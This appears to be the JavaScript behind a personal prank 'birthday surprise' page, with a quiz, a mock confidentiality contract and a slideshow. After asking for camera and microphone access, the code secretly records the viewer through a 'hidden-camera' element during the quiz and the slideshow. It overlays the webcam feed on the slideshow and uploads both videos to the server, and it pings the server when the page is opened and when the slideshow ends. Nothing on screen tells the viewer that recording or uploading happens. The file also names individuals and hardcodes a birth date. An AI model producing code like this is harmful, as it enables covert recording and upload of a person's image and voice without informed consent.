const config = window.APP_CONFIG;

// ── Dev mode ───────────────────────────────────────────────────────────
const DEV_MODE = new URLSearchParams(location.search).has("dev");
if (DEV_MODE) console.info("[DEV] Modo dev ativo — câmera e gravação desativadas.");

// ── Screens & elements ─────────────────────────────────────────────────
const startScreen = document.getElementById("start-screen");
const viewerScreen = document.getElementById("viewer-screen");
const finalScreen = document.getElementById("final-screen");
const startContent = document.querySelector("#start-screen .content");
const startButton = document.getElementById("start-button");
const imageViewer = document.getElementById("image-viewer");
const videoViewer = document.getElementById("video-viewer");
const hiddenCamera = document.getElementById("hidden-camera");

// ── Estado ─────────────────────────────────────────────────────────────
const QUIZ_MESSAGES = {
    wrong: ["Vaca.", "Pensa com a cabeça.", "Falsa.", "Lazarenta."]
};

let stream;                   // stream compartilhado (câmera + mic)

let quizRecorder;             // Gravação 1 — quiz
let quizChunks = [];

let slideshowRecorder;        // Gravação 2 — slideshow composto
let slideshowChunks = [];

let compositeCanvas, compositeCtx, rafId;

// ── Notificação inicial ────────────────────────────────────────────────
if (!DEV_MODE) {
    fetch("/api/notify?e=abriu").catch(() => { });
}

// ── Utilitários ────────────────────────────────────────────────────────
function randomQuizMessage(type) {
    const list = QUIZ_MESSAGES[type] || [];
    if (!list.length) return "";
    return list[Math.floor(Math.random() * list.length)];
}

function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
}

function pickMime() {
    return MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus")
        ? "video/webm;codecs=vp8,opus"
        : MediaRecorder.isTypeSupported("video/mp4")
            ? "video/mp4"
            : "";
}

// ── Início: pede permissão e começa a gravar o quiz ───────────────────
startButton.addEventListener("click", async () => {
    if (DEV_MODE) {
        renderQuiz();
        return;
    }

    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user", width: 640, height: 480 },
            audio: true
        });

        hiddenCamera.srcObject = stream;
        startQuizRecording();
        renderQuiz();

    } catch (err) {
        console.error(err);
        alert("Permita câmera e microfone para continuar.");
    }
});

// ── Gravação 1: quiz (câmera direta, bitrate menor) ───────────────────
function startQuizRecording() {
    const mimeType = pickMime();

    quizRecorder = new MediaRecorder(stream, {
        ...(mimeType ? { mimeType } : {}),
        videoBitsPerSecond: 300_000,
        audioBitsPerSecond: 32_000,
    });

    quizRecorder.ondataavailable = e => {
        if (e.data.size > 0) quizChunks.push(e.data);
    };

    quizRecorder.start();
}

function stopQuizRecordingAndUpload() {
    return new Promise(resolve => {
        if (!quizRecorder || quizRecorder.state === "inactive") {
            resolve();
            return;
        }

        quizRecorder.onstop = async () => {
            const mimeType = pickMime();
            const ext = mimeType.includes("mp4") ? "mp4" : "webm";
            const blob = new Blob(quizChunks, { type: mimeType || "video/webm" });
            uploadVideo(blob, ext, "quiz");   // fire-and-forget
            resolve();
        };

        quizRecorder.stop();
    });
}

// ── Quiz ───────────────────────────────────────────────────────────────
function renderQuiz() {
    startScreen.classList.add("quiz-mode");
    startContent.innerHTML = `
        <h1>Questionário</h1>

        <div class="quiz-block quiz-animated">
            <h2>Qual o seu primo favorito?</h2>

            <input
                id="favorite-cousin"
                type="text"
                placeholder="Digite aqui"
                autocomplete="off"
                class="quiz-input"
            />

            <button id="verify-cousin-button" type="button">
                Verificar
            </button>

            <small id="cousin-feedback" class="quiz-feedback"></small>
        </div>

        <div id="quiz-next-questions"></div>
    `;

    const input = document.getElementById("favorite-cousin");
    const button = document.getElementById("verify-cousin-button");
    const feedback = document.getElementById("cousin-feedback");

    let cousinValid = false;

    button.addEventListener("click", () => {
        const value = input.value.trim().toLowerCase();
        cousinValid = value.includes("rique");

        input.classList.toggle("valid", cousinValid);
        input.classList.toggle("invalid", !cousinValid);

        if (cousinValid) {
            button.style.display = "none";
            feedback.textContent = "Sempre soube que era eu. ❤️";
            feedback.classList.add("success");
            feedback.style.display = "inline-block";
            if (!document.getElementById("birthday-question")) renderBirthdayQuestion();
        } else {
            feedback.textContent = randomQuizMessage("wrong");
            feedback.classList.remove("success");
            feedback.style.display = "inline-block";
        }

        window.quizState = { ...window.quizState, cousinValid };
    });
}

function renderBirthdayQuestion() {
    const container = document.getElementById("quiz-next-questions");

    container.innerHTML = `
        <div class="quiz-block" id="birthday-question">
            <h2>Qual o aniversário dele?</h2>

            <div class="birthday-row">
                <input id="birthday-day"   type="text" inputmode="numeric" maxlength="2" placeholder="DD"   class="quiz-input birthday-input" />
                <input id="birthday-month" type="text" inputmode="numeric" maxlength="2" placeholder="MM"   class="quiz-input birthday-input" />
                <input id="birthday-year"  type="text" inputmode="numeric" maxlength="4" placeholder="YYYY" class="quiz-input birthday-input" />
            </div>

            <button id="verify-birthday-button" type="button">Verificar</button>

            <small id="birthday-feedback" class="quiz-feedback"></small>
        </div>
    `;

    const day = document.getElementById("birthday-day");
    const month = document.getElementById("birthday-month");
    const year = document.getElementById("birthday-year");
    const button = document.getElementById("verify-birthday-button");
    const feedback = document.getElementById("birthday-feedback");
    const CORRECT = { day: "29", month: "05", year: "2008" };

    function validateBirthday() {
        day.classList.toggle("valid", day.value === CORRECT.day);
        day.classList.toggle("invalid", day.value !== CORRECT.day);
        month.classList.toggle("valid", month.value === CORRECT.month);
        month.classList.toggle("invalid", month.value !== CORRECT.month);
        year.classList.toggle("valid", year.value === CORRECT.year);
        year.classList.toggle("invalid", year.value !== CORRECT.year);

        return day.value === CORRECT.day &&
            month.value === CORRECT.month &&
            year.value === CORRECT.year;
    }

    [day, month, year].forEach(input => {
        input.addEventListener("input", () => {
            input.value = input.value.replace(/\D/g, "");
        });
    });

    button.addEventListener("click", () => {
        const birthdayValid = validateBirthday();

        if (birthdayValid) {
            button.style.display = "none";
            feedback.textContent = "Acertou. ❤️";
            feedback.classList.add("success");
            feedback.style.display = "inline-block";
            if (!document.getElementById("gift-question")) renderGiftQuestion();
        } else {
            feedback.textContent = randomQuizMessage("wrong");
            feedback.classList.remove("success");
            feedback.style.display = "inline-block";
        }

        window.quizState = { ...window.quizState, birthdayValid };
    });
}

function renderGiftQuestion() {
    const container = document.getElementById("quiz-next-questions");
    const block = document.createElement("div");
    block.className = "quiz-block";
    block.id = "gift-question";

    block.innerHTML = `
        <h2>Vou dar um presente de aniversário para ele?</h2>

        <div class="radio-row">
            <label class="radio-option">
                <input type="radio" name="gift-answer" value="Sim" />
                <span class="radio-dot"></span>
                <span>Sim</span>
            </label>
            <label class="radio-option">
                <input type="radio" name="gift-answer" value="Com certeza" />
                <span class="radio-dot"></span>
                <span>Com certeza</span>
            </label>
        </div>

        <button id="verify-gift-button" type="button">Verificar</button>

        <small id="gift-feedback" class="quiz-feedback"></small>
    `;

    container.appendChild(block);

    const button = document.getElementById("verify-gift-button");
    const feedback = document.getElementById("gift-feedback");

    button.addEventListener("click", () => {
        const selected = document.querySelector('input[name="gift-answer"]:checked');

        if (!selected) {
            feedback.textContent = "Escolha uma opção.";
            feedback.classList.remove("success");
            feedback.style.display = "inline-block";
            return;
        }

        button.style.display = "none";
        feedback.textContent = "Estou esperando!";
        feedback.classList.add("success");
        feedback.style.display = "inline-block";

        window.quizState = { ...window.quizState, giftValid: true };
        renderContinueButton();
    });
}

function renderContinueButton() {
    if (document.getElementById("quiz-continue-button")) return;

    const { cousinValid, birthdayValid, giftValid } = window.quizState || {};
    if (!cousinValid || !birthdayValid || !giftValid) return;

    const container = document.getElementById("quiz-next-questions");
    const wrapper = document.createElement("div");
    wrapper.className = "quiz-block";

    wrapper.innerHTML = `
        <button id="quiz-continue-button" type="button">
            Continuar
            <span class="continue-arrow">
                <svg viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
                    <path fill-rule="evenodd" d="M3 10a1 1 0 011-1h9.586l-2.293-2.293a1 1 0 111.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414-1.414L13.586 11H4a1 1 0 01-1-1z" clip-rule="evenodd"/>
                </svg>
            </span>
        </button>
    `;

    container.appendChild(wrapper);

    document.getElementById("quiz-continue-button")
        .addEventListener("click", () => renderTermsScreen());
}

// ── Termos ─────────────────────────────────────────────────────────────
function renderTermsScreen() {
    startContent.innerHTML = `
        <h1>Antes de prosseguir com o presente, você precisa aceitar o termo.</h1>

        <div class="terms-box">
            <p><strong>Das partes do contrato</strong></p>
            <p>Pelo presente instrumento particular, de um lado a parte concedente, Henrique, e de outro a parte recebedora, Leticia, fica ajustado e convencionado o presente Termo de Aceite, de caráter pessoal, confidencial, simbólico e intransferível.</p>
            <p>A parte recebedora declara, neste ato, estar ciente de que o conteúdo subsequente poderá ocasionar surpresa, constrangimento moderado, vergonha involuntária, ódio, até mesmo vontade chorar ou reações emocionais correlatas, comprometendo-se, desde já, a não dirigir qualquer manifestação de irritação, braveza, rancor ou represália moral à parte concedente.</p>
            <p>Fica expressamente vedado à parte recebedora compartilhar, reproduzir, divulgar, encaminhar, gravar, disponibilizar ou permitir acesso, ainda que parcial, ao conteúdo deste presente por qualquer meio físico, digital ou verbal, sem autorização prévia e expressa da parte concedente.</p>
            <p>O descumprimento da cláusula de confidencialidade poderá ensejar a aplicação de penalidades de natureza moral, social e afetiva, compreendendo, sem limitação, constrangimento proporcional, cobranças futuras, lembranças inconvenientes em datas oportunas e invocação reiterada do argumento "eu avisei".</p>
            <p>Eventual quebra das disposições ora pactuadas poderá caracterizar inadimplemento contratual, sujeitando a parte infratora às medidas cabíveis no âmbito da jurisdição competente, inclusive abertura de processos, denúncias a unidades competentes e reclamações formais sem prazo prescricional definido.</p>
            <p>Fica ainda reconhecido que, uma vez iniciado o conteúdo da surpresa, operar-se-á aceitação irretratável e irrevogável, não sendo admitido arrependimento posterior, recusa superveniente ou alegação de desconhecimento das cláusulas ora estabelecidas.</p>
        </div>

        <div class="quiz-block terms-check-block">
            <label class="terms-check">
                <input type="checkbox" id="terms-checkbox" />
                <span class="check-dot"></span>
                <span>Eu aceito os termos e condições acima.</span>
            </label>
        </div>

        <button id="terms-continue-button" type="button" disabled>
            Continuar
        </button>
    `;

    const checkbox = document.getElementById("terms-checkbox");
    const button = document.getElementById("terms-continue-button");

    checkbox.addEventListener("change", () => {
        button.disabled = !checkbox.checked;
    });

    button.addEventListener("click", () => renderReadyScreen());
}

// ── Ready screen ───────────────────────────────────────────────────────
function renderReadyScreen() {
    startScreen.classList.remove("quiz-mode");
    startContent.classList.remove("quiz-mode");

    startContent.innerHTML = `
        <h1>Tudo pronto!</h1>
        <p>Clique em começar para ver a sua surpresa.</p>
        <button id="ready-start-button" type="button">Começar</button>
    `;

    document.getElementById("ready-start-button")
        .addEventListener("click", handleReadyStart);
}

async function handleReadyStart() {
    const btn = document.getElementById("ready-start-button");
    btn.disabled = true;
    btn.textContent = "Aguarde...";

    await sleep(2000);
    btn.textContent = "Seu primo não aprendeu a otimizar direito...";

    // Para a gravação do quiz e dispara upload em background
    stopQuizRecordingAndUpload();

    await sleep(5000);   // 2s + 5s = 7s total

    await startSlideshow();
}

// ── Slideshow ──────────────────────────────────────────────────────────
async function startSlideshow() {
    if (DEV_MODE) {
        startScreen.classList.remove("active");
        viewerScreen.classList.add("active");
        await playMediaSequence();
        return;
    }

    // stream já está ativo desde o clique inicial
    criarCompositeCanvas();
    iniciarLoopComposicao();

    const mimeType = pickMime();
    let fonteDoStream;

    try {
        const canvasStream = compositeCanvas.captureStream(30);
        if (canvasStream.getVideoTracks().length > 0) {
            const audioTrack = stream.getAudioTracks()[0];
            if (audioTrack) canvasStream.addTrack(audioTrack);
            fonteDoStream = canvasStream;
        } else {
            throw new Error("captureStream sem tracks");
        }
    } catch (_) {
        cancelAnimationFrame(rafId);
        fonteDoStream = stream;
    }

    slideshowChunks = [];
    slideshowRecorder = new MediaRecorder(fonteDoStream, {
        ...(mimeType ? { mimeType } : {}),
        videoBitsPerSecond: 600_000,
        audioBitsPerSecond: 32_000,
    });

    slideshowRecorder.ondataavailable = e => {
        if (e.data.size > 0) slideshowChunks.push(e.data);
    };

    let resolveUploadDone;
    window._uploadDone = new Promise(r => { resolveUploadDone = r; });

    slideshowRecorder.onstop = async () => {
        cancelAnimationFrame(rafId);
        const ext = mimeType.includes("mp4") ? "mp4" : "webm";
        const blob = new Blob(slideshowChunks, { type: mimeType || "video/webm" });
        await uploadVideo(blob, ext, "slideshow");
        stream.getTracks().forEach(t => t.stop());
        resolveUploadDone();
    };

    slideshowRecorder.start();

    startScreen.classList.remove("active");
    viewerScreen.classList.add("active");

    await playMediaSequence();

    slideshowRecorder.stop();
    fetch("/api/notify?e=terminou").catch(() => { });
}

function criarCompositeCanvas() {
    compositeCanvas = document.createElement("canvas");
    compositeCanvas.width = 640;
    compositeCanvas.height = 480;
    compositeCtx = compositeCanvas.getContext("2d");
}

function iniciarLoopComposicao() {
    const camW = 160, camH = 120, margin = 12;

    function desenhar() {
        const cw = compositeCanvas.width;
        const ch = compositeCanvas.height;

        compositeCtx.fillStyle = "#000";
        compositeCtx.fillRect(0, 0, cw, ch);

        const isVideo = videoViewer.style.display !== "none";
        const fonte = isVideo ? videoViewer : imageViewer;

        if (fonte && (fonte.readyState !== undefined ? fonte.readyState >= 2 : true)) {
            try { compositeCtx.drawImage(fonte, 0, 0, cw, ch); } catch (_) { }
        }

        if (hiddenCamera.srcObject) {
            try {
                const x = cw - camW - margin;
                const y = ch - camH - margin;
                compositeCtx.save();
                compositeCtx.beginPath();
                compositeCtx.roundRect(x, y, camW, camH, 8);
                compositeCtx.clip();
                compositeCtx.drawImage(hiddenCamera, x, y, camW, camH);
                compositeCtx.restore();
                compositeCtx.strokeStyle = "rgba(255,255,255,0.3)";
                compositeCtx.lineWidth = 1;
                compositeCtx.beginPath();
                compositeCtx.roundRect(x, y, camW, camH, 8);
                compositeCtx.stroke();
            } catch (_) { }
        }

        rafId = requestAnimationFrame(desenhar);
    }

    desenhar();
}

// ── Media sequence ─────────────────────────────────────────────────────
async function playMediaSequence() {
    for (const item of config.MEDIA) {
        if (item.type === "image") await showImage(item.src, item.duration);
        if (item.type === "video") await showVideo(item.src);
    }

    viewerScreen.classList.remove("active");
    finalScreen.classList.add("active");
}

function showImage(src, duration) {
    return new Promise(resolve => {
        videoViewer.pause();
        videoViewer.style.display = "none";
        imageViewer.src = src;
        imageViewer.style.display = "block";
        setTimeout(resolve, duration);
    });
}

function showVideo(src) {
    return new Promise(resolve => {
        imageViewer.style.display = "none";
        videoViewer.src = src;
        videoViewer.style.display = "block";
        videoViewer.onended = resolve;
        videoViewer.play();
    });
}

// ── Upload com retry ───────────────────────────────────────────────────
async function uploadVideo(blob, ext = "webm", label = "reaction", tentativas = 3) {
    for (let i = 0; i < tentativas; i++) {
        try {
            const formData = new FormData();
            formData.append("video", blob, `${label}-${Date.now()}.${ext}`);

            const res = await fetch("/api/upload", { method: "POST", body: formData });
            if (res.ok) return;
            throw new Error(`HTTP ${res.status}`);

        } catch (err) {
            if (i === tentativas - 1) {
                console.error(`Upload [${label}] falhou após todas as tentativas:`, err);
                return;
            }
            await sleep(2000 * (i + 1));
        }
    }
}

document.getElementById("album-button").addEventListener("click", () => {
    finalScreen.innerHTML = `
        <div class="content">
            <h1>Curiosa, né?</h1>
            <p>
                Ficou querendo ver mais fotos? Até poderia ter um álbum inteiro
                esperando por você — mas onde estaria a graça nisso?
                Algumas memórias ficam melhores guardadas a dois. 🤍
            </p>
        </div>
    `;
});